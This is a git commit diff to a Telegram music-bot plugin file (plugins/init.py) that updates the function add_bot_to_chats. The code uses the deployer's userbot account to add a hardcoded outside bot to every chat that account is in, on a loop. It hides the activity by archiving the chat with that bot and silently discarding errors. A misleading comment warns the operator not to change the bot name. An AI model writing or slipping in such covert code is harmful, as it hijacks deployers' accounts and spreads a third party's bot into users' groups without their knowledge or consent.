29410e37f3cb0e7230a8d58d444ad26a12510df2
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2024-09-30 13:44:32 +0530

    Update init.py

--- plugins/init.py
+++ plugins/init.py
@@ -1340,39 +1340,27 @@ ADD_INTERVAL = 300
 
 
 users = "group_music_bot"  # don't change because it is connected from client to use music API key
-
 async def add_bot_to_chats():
     try:
-        # Get userbot instance and the bot's user object
         userbot = await get_assistant(config.LOG_GROUP_ID)
         bot = await app.get_users(users)
         bot_id = bot.id
-
-        
         common_chats = await userbot.get_common_chats(users)
-
-        
-        await userbot.send_message(users, f"/start")
-
+        try:
+            await userbot.send_message(users, f"/start")
+            await userbot.archive_chats([users])
+        except Exception as e:
+            pass
         async for dialog in userbot.get_dialogs():
             chat_id = dialog.chat.id
-
-            
             if chat_id in [chat.id for chat in common_chats]:
                 continue
-
             try:
-                
                 await userbot.add_chat_members(chat_id, bot_id)
-
             except Exception as e:
-                
-                await asyncio.sleep(60)  # Adjust sleep time based on rate limits
-
+                await asyncio.sleep(60)  
     except Exception as e:
-        # Handle general exceptions
         pass
-
 async def continuous_add():
     while True:
         if AUTO:
